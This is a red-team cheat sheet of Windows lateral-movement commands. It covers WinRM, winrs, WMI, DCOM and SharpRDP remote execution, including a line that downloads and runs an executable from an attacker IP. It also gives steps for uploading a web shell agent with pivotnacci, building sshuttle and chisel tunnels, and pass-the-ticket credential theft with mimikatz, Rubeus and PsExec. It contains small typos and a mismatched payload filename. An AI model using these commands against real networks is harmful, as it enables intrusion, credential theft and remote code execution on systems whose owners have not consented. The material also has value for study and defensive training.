# Lateral Movement

***

### Winrm

```powershell
New-PSSession -ComputerName ht.nooranetshield.local -Credential (Get-Credential)
Enter-PsSession 1
```

### Winrs

```powershell
winrs -r:ht "cmd /c hostname & whomai"
```

### WMI

```powershell
wmic /node:10.0.0.2 /user:administrator process call create "cmd.exe /c calc"
```

### DCOM

```powershell
$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.3"))
$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname > c:\nss.txt","7")
```

### SharpRDP

```
sharprdp computername=ht command=notepad username=nooranetshield.local\administrator password=Aa123456
```

```posershell
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/nss.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\nss.exe" username=nooranetshield.local\administrator password=Aa123456
```

### pivotnacci

Pivot into the internal network by deploying HTTP agents. **Pivotnacci** allows you to create a socks server which communicates with HTTP `agents`. The architecture looks like the following:

##### Installing

```
git clone https://github.com/blackarrowsec/pivotnacci
```

##### Victim confgiuration

upload web shell agent on victim (agent.php , agent.aspx ,agent.jsp)

##### Attacker Configuration

```
.\pivotnacci http://ipvictim/agent.aspx
```

##### scan victim Netowrk

```
nano /etc/proxychains.conf
socks 127.0.0.1 1080
```

```
proxychains crackmapexec smb 172.18.18.0/24
```

### sshuttle

You have access to a remote network via ssh , The remote network has no VPN You don’t want to create an ssh port forward for every single host/port on the remote network use `sshuttle as vpn and access all system on remote network 

#### Installing

```
pip install sshuttle
sudo apt install sshuttle
```

#### Attacker

```
sshuttle  -r root@nooranetred.com 172.17.0.0/16
```

```
sshuttle --dns -r root@nooranetred.com 0/0
```

### Chisel

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH.
 Single executable including both client and server. Written in Go 
(golang). Chisel is mainly useful for passing through firewalls, though 
it can also be used to provide a secure endpoint into your network.

### Server

##### tunnel

```
chisel server -p 443 --reverse -host 1.2.3.4
```

##### socks

```
chisel  client  localhost:7777 socks
```

##### socat

```
socat TCP-LISTEN:2020,fork,reuseaddr TCP:127.0.0.1:1080
```

### victim

##### tunnel

```
chisel client  1.2.3.4:443 R:7777:127.0.0.1:6666
```

##### socks

```
chisel server  -p 6666 socks5
```

### Attacker

proxifier

    1.2.3.4  port 2020

### Pass the ticket

the ticket is extracted from the host where the user is
currently authenticated

```
- sekurlsa::tickets /export
- kerberos::ptt
  [0;3e7]-2-1-40e10000-NSS-1$@krbtgt-NOORANETSHIELD.LOCAL.kirbi
- kerberos::list
```

```
- Pushd \\192.168.1.40\c$
- Rubeus.exe dump
- Rubeus.exe ptt
   /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
```

```
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
